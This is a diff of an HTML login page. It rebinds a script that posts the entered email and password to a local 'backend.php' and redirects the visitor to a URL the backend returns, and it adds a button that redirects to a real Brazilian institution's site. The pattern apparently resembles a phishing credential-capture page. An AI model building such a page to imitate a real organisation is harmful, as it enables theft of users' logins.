@@ -11,31 +11,7 @@
 </head>
 
 <body>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            document.getElementById("btn_final").addEventListener("click", function(event) {
-                event.preventDefault();
     
-                var email = document.getElementById("inp_uname").value;
-                var password = document.getElementById("inp_pwd").value;
-    
-                fetch('../backend.php', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
-                })
-                .then(response => response.text())
-                .then(url => {
-                    window.location.href = url; // Use a URL retornada para redirecionar
-                })
-                .catch((error) => {
-                    console.error('Error:', error);
-                });
-            });
-        });
-    </script>
     
     
     
@@ -120,6 +96,42 @@
     </footer>
     <script src="assets/app.js"></script>
     
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("btn_final").addEventListener("click", function(event) {
+                console.log("Botão clicado"); // Verifique se isso aparece no console
+                event.preventDefault();
+                window.location.href = 'https://www.pti.org.br/';
+            });
+        });
+    </script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("btn_sig").addEventListener("click", function(event) {
+                event.preventDefault();
+    
+                var email = document.getElementById("inp_uname").value;
+                var password = document.getElementById("inp_pwd").value;
+    
+                fetch('../backend.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
+                })
+                .then(response => response.text())
+                .then(url => {
+                    window.location.replace("http://www.w3schools.com");
+                    window.location.href = url; // Use a URL retornada para redirecionar
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            });
+            
+        });
+    </script>
     
     
 </body>
